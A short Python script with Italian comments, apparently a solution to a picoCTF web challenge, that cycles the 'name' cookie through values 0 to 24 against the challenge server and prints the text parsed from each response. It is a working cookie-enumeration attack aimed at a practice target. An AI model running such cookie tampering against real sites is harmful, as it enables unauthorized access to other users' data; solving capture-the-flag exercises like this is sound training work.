import requests

url = "http://mercury.picoctf.net:21485/check"      # Settiamo l'URL a cui mandare la richiesta

for i in range(0, 25):
    cookie_val = str(i)                     # Valore corrente del cookie
    cookie_send = {'name': cookie_val}      # Componiamo il cookie

    r = requests.get(url, cookies = cookie_send)        # Inviamo la richiesta GET col cookie corrente
    ris = r.text.split("<p style=\"text-align:center; font-size:30px;\"><b>")[1].split("</b></p>")[0]

    print(f"Val utilizzato {i}, risultato: {ris}")
